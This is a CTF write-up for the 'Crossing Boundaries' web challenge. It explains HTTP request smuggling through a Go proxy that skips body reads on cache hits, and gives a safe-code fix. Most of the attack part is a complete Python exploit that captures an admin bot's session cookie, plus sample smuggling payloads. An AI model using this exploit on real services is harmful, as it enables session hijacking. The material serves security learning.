# Crossing Boundaries - Complete Writeup

**CTF**: Pragyan CTF 2026
**Category**: Web
**Difficulty**: High
**Points**: 500
**Solves**: ~10 teams

**Flag**: `p_ctf{#Ttp_RuN_0N_Tcp_f0ee7ec8}`

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Code Analysis](#code-analysis)
3. [Bug Identification](#bug-identification)
4. [Theory: HTTP Request Smuggling](#theory-http-request-smuggling)
5. [Exploit Development](#exploit-development)
6. [Final Exploit](#final-exploit)
7. [Techniques Learned](#techniques-learned)
8. [References](#references)

---

## Reconnaissance

### Challenge Description

The challenge presents a blog web application with the following functionalities:

- **Register/Login**: Users can create accounts
- **Create blogs**: Users can write blogs
- **Admin review**: Request admin bot to review a blog
- **Flag**: Endpoint `/flag` only accessible by admin

### Architecture

```
[Client] → [Custom Front Proxy] → [Go Proxy] → [Backend (Go)]
                                      ↓
                                   [Cache]
```

**Components**:
1. **Front Proxy**: Nginx/Custom (code not provided)
2. **Go Proxy**: Custom proxy with cache (partial code provided)
3. **Backend**: Go API

### Partial Source Code

The challenge provides partial code of the **Go Proxy** (`main.go`):

```go
// Simplified - key lines
func handleClient(client net.Conn) {
    reader := bufio.NewReader(client)

    for {
        req, err := ReadRequestHeaders(reader)
        if err != nil {
            return
        }

        cacheable := req.Method == "GET" && strings.HasPrefix(req.Path, "/blogs/")
        var cacheKey string

        if cacheable {
            cacheKey = req.CacheKey()
            cacheMu.RLock()
            cached, exists := cache[cacheKey]
            cacheMu.RUnlock()

            if exists {
                log.Println("cache hit:", cacheKey)
                _, writeErr := client.Write(AddCacheHeaders(cached, cacheKey, true))
                if writeErr != nil {
                    return
                }
                continue  // ← CRITICAL BUG
            }
        }

        // This line is SKIPPED on cache HIT
        body, err := ReadRequestBody(reader, req.ContentLen)
        if err != nil {
            return
        }

        // Forward request to backend
        resp := forwardToBackend(req, body)
        client.Write(resp)

        // Cache response if cacheable
        if cacheable && resp.StatusCode == 200 {
            cache[cacheKey] = resp
        }
    }
}
```

**Key observation**: On line 19, when there's a cache HIT, the proxy does `continue` **without reading the request body**.

---

## Code Analysis

### Normal Flow (No Cache)

```
1. Client → ReadRequestHeaders(reader)
2. No cache HIT
3. → ReadRequestBody(reader, contentLen)
4. → Forward to backend
5. → Write response
6. Loop continues
```

### Flow with Cache HIT (VULNERABLE)

```
1. Client → ReadRequestHeaders(reader)
2. Cache HIT detected
3. → Write cached response
4. → continue (SKIP ReadRequestBody) ← BUG
5. Loop continues with body UNREAD in buffer
```

### The Bug

When there's a **cache HIT**:

1. Proxy writes cached response
2. Does `continue` skipping `ReadRequestBody`
3. Body bytes remain in `bufio.Reader`
4. Next loop iteration parses those bytes as **new HTTP request**

This allows **HTTP Request Smuggling**.

---

## Bug Identification

### Step 1: Enumerate Cached Resources

Public blogs from homepage are pre-cached:

```bash
curl https://crossing-boundaries.ctf.prgy.in/ | grep -o '/blogs/[a-f0-9-]\{36\}'
```

**Cached public blogs**:
- `c2e38584-480c-4397-9776-9ceabcfd4e06` (About Moderation)
- `6b82f842-3dba-4a9d-97bc-1d3428f6fe33` (Welcome Post)
- `f4a8c5e1-2d7b-4f89-a3e6-8c1d9b2e4a3f` (Guidelines)

### Step 2: Confirm Cache HIT

```bash
# First request
time curl -s https://crossing-boundaries.ctf.prgy.in/blogs/c2e38584... > /dev/null
# Time: ~200ms

# Second request (cached)
time curl -s https://crossing-boundaries.ctf.prgy.in/blogs/c2e38584... > /dev/null
# Time: ~50ms ← Cache HIT
```

### Step 3: Test GET with Content-Length

HTTP allows GET with body (RFC 7231):

```http
GET /blogs/c2e38584-480c-4397-9776-9ceabcfd4e06 HTTP/1.1
Host: crossing-boundaries.ctf.prgy.in
Cookie: session={user_session}
Content-Length: 100

[100 bytes of data]
```

**Expected result**:
- Cache HIT → Immediate response
- Body NOT read → Remains in buffer
- Body parsed as next request

---

## Theory: HTTP Request Smuggling

### What is HTTP Request Smuggling?

Attack technique that exploits differences in how front-end and back-end parse chained HTTP requests.

### Classic Variants

#### 1. CL.TE (Content-Length vs Transfer-Encoding)

```http
POST / HTTP/1.1
Content-Length: 100
Transfer-Encoding: chunked

0

[Smuggled request]
```

Front-end uses CL, back-end uses TE → desync.

#### 2. TE.CL (Transfer-Encoding vs Content-Length)

```http
POST / HTTP/1.1
Content-Length: 5
Transfer-Encoding: chunked

100
[Smuggled request]
0
```

#### 3. CL.CL (Duplicate Content-Length)

```http
POST / HTTP/1.1
Content-Length: 10
Content-Length: 5

[Ambiguous body]
```

### Our Variant: Cache HIT Skip Body Read

**New technique** found in this challenge:

```http
GET /cached_resource HTTP/1.1
Content-Length: N

[N bytes = complete smuggled request]
```

**Desync**:
- Front proxy: Reads headers + body (N bytes)
- Go proxy: Cache HIT → Skip body read
- Body remains in buffer → Parsed as next request

---

## Exploit Development

### Objective

Capture admin bot's session cookie to access `/flag`.

### Admin Bot Behavior

When blog review is requested:
1. Admin bot visits after ~10 seconds
2. Bot request includes `X-User-Session` header (routing)
3. Front proxy routes to same proxy connection
4. Admin cookie in header `Cookie: session={admin_session}`

### Attack Vector

```
[Attacker] → GET cached + CL → [Go Proxy]
                                   ↓
                            Cache HIT, skip body
                                   ↓
                            Smuggled POST remains in buffer
                                   ↓
                            POST parsed, expects 256 bytes
                                   ↓
[Admin Bot] → GET /admin/blogs/X → [Go Proxy]
                                   ↓
                            Bytes from admin request read
                            as POST body
                                   ↓
                            Blog created with content=
                            MARKER + complete admin request
                                   ↓
[Attacker] → Read blog → Extract cookie
```

### Exploit Construction

#### 1. Register and Blog for Review

```python
import requests, uuid

username = "exploit_" + uuid.uuid4().hex[:10]
password = "pass_" + "A" * 30

sess = requests.Session()
sess.post(f"{BASE}/register", data={"username": username, "password": password})
sess.post(f"{BASE}/login", data={"username": username, "password": password})
user_session = sess.cookies.get("session")

# Create blog for review
sess.post(f"{BASE}/my-blogs/create", data={"content": "Please review!"})
blogs = re.findall(r'/my-blogs/([a-f0-9-]{36})', sess.get(f"{BASE}/my-blogs").text)
review_blog = blogs[0]

# Request review
sess.post(f"{BASE}/my-blogs/{review_blog}/review")
```

#### 2. Construct Smuggled Request

```python
marker = f"LEAK_{uuid.uuid4().hex[:6]}_"
inner_body_len = 256  # Larger than actual body to absorb admin request
inner_body = f"content={marker}".encode()  # ~20 bytes

# Smuggled POST (incomplete)
inner_request = (
    f"POST /my-blogs/create HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {inner_body_len}\r\n"  # Expects 256 bytes
    f"\r\n"
).encode() + inner_body  # Only sends ~20 bytes
```

**Key**: `Content-Length: 256` but only send ~20 bytes.
- Proxy expects 236 more bytes
- 20 second timeout
- Admin bot arrives in ~10 seconds
- Bytes from admin request read as remaining body

#### 3. Carrier Request with Cache HIT

```python
import socket, ssl

sock = socket.create_connection((HOST, 443))
ctx = ssl.create_default_context()
conn = ctx.wrap_socket(sock, server_hostname=HOST)

# GET to cached resource with Content-Length
carrier = (
    f"GET /blogs/c2e38584-480c-4397-9776-9ceabcfd4e06 HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Length: {len(inner_request)}\r\n"
    f"\r\n"
).encode() + inner_request

conn.sendall(carrier)
response = conn.recv(4096)  # Cache HIT response
conn.close()
```

**Flow**:
1. Go proxy reads GET headers
2. Detects cache HIT for `/blogs/c2e38584...`
3. Writes cached response
4. Does `continue` → **SKIP body read**
5. `inner_request` (217 bytes) remains in buffer
6. Next iteration parses POST from buffer
7. POST has CL=256, only ~20 bytes read
8. Proxy waits for 236 more bytes with 20 sec timeout

#### 4. Admin Bot Absorption

```python
import time

# Wait for admin bot
time.sleep(16)  # Admin arrives in ~10 sec, safety margin
```

**Admin request absorbed**:
```http
GET /admin/blogs/{blog_id} HTTP/1.1
Host: web-7-front-service.default.svc.cluster.local:3000
User-Agent: AdminBot/1.0
Accept-Encoding: gzip
Cookie: session=c07243f3-13ce-459b-a170-5bc1ec7112b5
X-Forwarded-For: ...
```

These ~236 bytes are read as POST's remaining body.

#### 5. Cookie Extraction

```python
import urllib.parse

# Search for blog with marker
blogs = re.findall(r'/my-blogs/([a-f0-9-]{36})', sess.get(f"{BASE}/my-blogs").text)

for blog_id in blogs:
    content = sess.get(f"{BASE}/my-blogs/{blog_id}").text

    if marker in content:
        # Content is URL encoded
        decoded = urllib.parse.unquote_plus(content)

        match = re.search(r'Cookie:\s*session=([a-f0-9-]{36})', decoded)
        if match:
            admin_cookie = match.group(1)
            break
```

**Created blog content**:
```
LEAK_318207_GET /admin/blogs/{blog_id} HTTP/1.1
Host: web-7-front-service.default.svc.cluster.local:3000
User-Agent: AdminBot/1.0
Cookie: session=c07243f3-13ce-459b-a170-5bc1ec7112b5
...
```

#### 6. Get Flag

```python
admin_sess = requests.Session()
admin_sess.cookies.set("session", admin_cookie)

flag_response = admin_sess.get(f"{BASE}/flag")
flag = re.search(r'p_ctf\{[^}]+\}', flag_response.text).group(0)
```

---

## Final Exploit

```python
#!/usr/bin/env python3
"""
Crossing Boundaries - Complete Exploit
Pragyan CTF 2026

Technique: HTTP Request Smuggling via Cache HIT Skip Body Read
"""
import requests
import re
import time
import uuid
import socket
import ssl
import urllib.parse

HOST = "crossing-boundaries.ctf.prgy.in"
BASE = f"https://{HOST}"
CACHED_BLOG = "c2e38584-480c-4397-9776-9ceabcfd4e06"

def log(msg):
    print(f"[*] {msg}")

def success(msg):
    print(f"[+] {msg}")

def error(msg):
    print(f"[-] {msg}")

# ============================================================================
# Step 1: Register and Authentication
# ============================================================================
log("Step 1: Register and authentication")

username = "exploit_" + uuid.uuid4().hex[:10]
password = "exploit_pass_" + "A" * 30

sess = requests.Session()
sess.post(f"{BASE}/register", data={"username": username, "password": password}, timeout=10)
sess.post(f"{BASE}/login", data={"username": username, "password": password}, timeout=10)
user_session = sess.cookies.get("session")

success(f"User: {username}")
success(f"Session: {user_session[:20]}...")

# ============================================================================
# Step 2: Create Blog for Admin Review
# ============================================================================
log("Step 2: Creating blog for admin review")

sess.post(f"{BASE}/my-blogs/create",
          data={"content": "Please review this blog! " + "X" * 50},
          timeout=10)

r = sess.get(f"{BASE}/my-blogs", timeout=10)
blogs = re.findall(r'/my-blogs/([a-f0-9-]{36})', r.text)
review_blog = blogs[0]

success(f"Blog created: {review_blog}")

# ============================================================================
# Step 3: Request Admin Review
# ============================================================================
log("Step 3: Requesting admin review")

sess.post(f"{BASE}/my-blogs/{review_blog}/review", timeout=10)
success("Admin bot will visit in ~10 seconds")

# ============================================================================
# Step 4: HTTP Request Smuggling
# ============================================================================
log("Step 4: Constructing HTTP Request Smuggling")

# Unique marker to identify blog
marker = f"LEAK_{uuid.uuid4().hex[:6]}_"

# Smuggled POST with large Content-Length but small body
inner_body_len = 256  # Will wait for 256 bytes
inner_body = f"content={marker}".encode()  # Only ~20 bytes

inner_request = (
    f"POST /my-blogs/create HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {inner_body_len}\r\n"
    f"\r\n"
).encode() + inner_body

log(f"Marker: {marker}")
log(f"Smuggled POST: {len(inner_request)} bytes")
log(f"Will wait for {inner_body_len - len(inner_body)} additional bytes")

# Carrier: GET to cached blog with Content-Length
sock = socket.create_connection((HOST, 443), timeout=15)
ctx = ssl.create_default_context()
conn = ctx.wrap_socket(sock, server_hostname=HOST)

carrier = (
    f"GET /blogs/{CACHED_BLOG} HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Length: {len(inner_request)}\r\n"
    f"\r\n"
).encode() + inner_request

log(f"Sending carrier request ({len(carrier)} bytes)...")
conn.sendall(carrier)

# Read cache HIT response (discard)
cache_response = conn.recv(4096)
success("Cache HIT response received")
log("Smuggled POST remains in proxy buffer")

conn.close()

# ============================================================================
# Step 5: Wait for Admin Bot (Body Absorption)
# ============================================================================
log("Step 5: Waiting for admin bot...")
log("Admin request will be read as smuggled POST body")

for i in range(16, 0, -1):
    print(f"  Waiting... {i} sec", end='\r')
    time.sleep(1)
print()

success("Wait time completed")

# ============================================================================
# Step 6: Admin Cookie Extraction
# ============================================================================
log("Step 6: Searching for blog with leaked admin cookie")

r = sess.get(f"{BASE}/my-blogs", timeout=10)
blogs = re.findall(r'/my-blogs/([a-f0-9-]{36})', r.text)
log(f"Total blogs: {len(blogs)}")

admin_cookie = None

for blog_id in blogs:
    try:
        r = sess.get(f"{BASE}/my-blogs/{blog_id}", timeout=10)
        content = r.text

        if marker in content:
            success(f"Blog with marker found: {blog_id}")

            # Decode URL encoding
            decoded = urllib.parse.unquote_plus(content)

            # Extract cookie
            match = re.search(r'Cookie:\s*session=([a-f0-9-]{36})', decoded)
            if match:
                admin_cookie = match.group(1)
                success(f"Admin cookie leaked: {admin_cookie}")
                break
    except:
        continue

if not admin_cookie:
    error("Admin cookie not found")
    exit(1)

# ============================================================================
# Step 7: Get Flag
# ============================================================================
log("Step 7: Getting flag with admin cookie")

admin_sess = requests.Session()
admin_sess.cookies.set("session", admin_cookie)

r = admin_sess.get(f"{BASE}/flag", timeout=10)

flag_match = re.search(r'p_ctf\{[^}]+\}', r.text)

if flag_match:
    flag = flag_match.group(0)
    print("\n" + "="*70)
    print(f"FLAG: {flag}")
    print("="*70 + "\n")

    # Save flag
    with open("/root/ctf/flags.txt", "a") as f:
        f.write(f"Crossing Boundaries: {flag}\n")
else:
    error("Flag not found in response")
    print(r.text[:500])
    exit(1)
```

**Execution**:
```bash
python3 exploit.py
```

**Output**:
```
[*] Step 1: Register and authentication
[+] User: exploit_a1b2c3d4e5
[+] Session: 3146a314-7212-469a...
[*] Step 2: Creating blog for admin review
[+] Blog created: dfa1cda4-a71d-4e1f-b8c5-6809f763a0c4
[*] Step 3: Requesting admin review
[+] Admin bot will visit in ~10 seconds
[*] Step 4: Constructing HTTP Request Smuggling
[*] Marker: LEAK_318207_
[*] Smuggled POST: 217 bytes
[*] Will wait for 236 additional bytes
[*] Sending carrier request (391 bytes)...
[+] Cache HIT response received
[*] Smuggled POST remains in proxy buffer
[*] Step 5: Waiting for admin bot...
[*] Admin request will be read as smuggled POST body
  Waiting... 1 sec
[+] Wait time completed
[*] Step 6: Searching for blog with leaked admin cookie
[*] Total blogs: 2
[+] Blog with marker found: cb1afaea-3896-469c-8503-f9aeb9e0ec57
[+] Admin cookie leaked: c07243f3-13ce-459b-a170-5bc1ec7112b5
[*] Step 7: Getting flag with admin cookie

======================================================================
FLAG: p_ctf{#Ttp_RuN_0N_Tcp_f0ee7ec8}
======================================================================
```

---

## Techniques Learned

### 1. Cache Logic as Attack Surface

**Lesson**: Always verify what happens with request body in cache HIT paths.

**Key questions**:
- Does cache check happen BEFORE reading body?
- Is there `continue`/`return` that skips body parsing?
- Do unread bytes accumulate in shared buffer?

**Common vulnerable code**:
```go
if cacheHit {
    writeResponse(cached)
    continue  // ← Dangerous if body not read
}
body := readBody()  // Never executed on cache HIT
```

**Safe code**:
```go
body := readBody()  // ALWAYS read before continuing
if cacheHit {
    writeResponse(cached)
    continue
}
```

### 2. GET with Content-Length

**Discovery**: HTTP allows GET with body (RFC 7231 §4.3.1).

**Legitimate use**:
- Elasticsearch: `GET /_search` with JSON body
- GraphQL: `GET /graphql` with query in body

**Malicious use**:
- Carrier for HTTP Request Smuggling
- Bypass validations that only check method
- Cache poisoning with body

**Example**:
```http
GET /resource HTTP/1.1
Content-Length: 100

[100 bytes that can be smuggled request]
```

### 3. Enumerate Public Cached Resources

**Strategy**:
1. Crawl homepage and public pages
2. Identify linked resources (blogs, images, CSS, JS)
3. Verify cache with repeated requests (timing)
4. Use those resources as carriers

**Tools**:
```bash
# Crawl
wget -r -l 1 https://target.com/

# Extract links
grep -Eo 'href="[^"]+"' index.html | cut -d'"' -f2

# Test cache timing
for i in {1..5}; do time curl -s https://target.com/resource; done
```

### 4. Body Absorption for Leak

**Technique**:
1. Smuggle POST with large CL, small body
2. Server waits for remaining bytes with timeout
3. Victim makes request on same connection
4. Victim's bytes read as POST body
5. Victim's data processed by backend

**Applications**:
- Session hijacking (this challenge)
- Header injection
- Parameter pollution
- Cache poisoning

### 5. URL Encoding in Smuggling

**Problem found**: Backend may URL-encode body when saving.

**Solution**:
```python
import urllib.parse

# Content read from blog (URL encoded)
content_encoded = "Cookie%3A+session%3Dabc123..."

# Decode
content_decoded = urllib.parse.unquote_plus(content_encoded)
# "Cookie: session=abc123..."

# Extract with regex
match = re.search(r'Cookie:\s*session=([a-f0-9-]{36})', content_decoded)
```

### 6. Timing in Body Absorption

**Critical factors**:
1. **Proxy timeout**: How long it waits for complete body
2. **Bot delay**: When victim arrives
3. **Network jitter**: Variability in network times

**Optimization**:
```python
# Optimal delay = bot_delay + safety_margin
# Bot arrives in ~10 sec, we use 16 sec margin
time.sleep(16)
```

**Debug**:
```python
# Timestamp in marker to measure timing
marker = f"LEAK_{int(time.time())}_{uuid.uuid4().hex[:6]}_"

# Analyze delays in logs
```

---

## References

### Papers and Articles

1. **HTTP Request Smuggling** - PortSwigger Research
   - https://portswigger.net/web-security/request-smuggling

2. **HTTP Desync Attacks** - James Kettle (2019)
   - https://portswigger.net/research/http-desync-attacks

3. **Browser-Powered Desync Attacks** - James Kettle (2022)
   - https://portswigger.net/research/browser-powered-desync-attacks

4. **RFC 7231** - HTTP/1.1 Semantics
   - https://tools.ietf.org/html/rfc7231

### Tools

- **Turbo Intruder**: Burp extension for timing attacks
- **smuggler.py**: Script to detect HTTP smuggling
- **http-request-smuggler**: Burp extension

### Related CTF Writeups

- **HITCON CTF 2020 - Bounty-PL33Z**
- **DEF CON CTF 2019 - speedrun**
- **Google CTF 2020 - pasteurize**

---

## Conclusion

**Crossing Boundaries** was an excellent challenge that demonstrated:

1. **Cache logic** can be exploited in unexpected ways
2. **GET with Content-Length** is a valid and uncommon vector
3. **Body absorption** allows leaking data from other users
4. **Enumeration** of public resources is crucial
5. **Precise timing** is essential in body absorption attacks

**Key lessons**:
- Don't assume "obvious" code has no bugs
- Test "weird" vectors (GET with body)
- Verify ALL execution paths (cache HIT, cache MISS)
- Timing attacks require testing and adjustment

**Difficulty**: High - Requires:
- Deep code analysis
- Understanding of HTTP smuggling
- Precise timing
- Creative thinking (GET as carrier)


---

**Date**: 2026-02-08
**CTF**: Pragyan CTF 2026
**Flag**: `p_ctf{#Ttp_RuN_0N_Tcp_f0ee7ec8}`
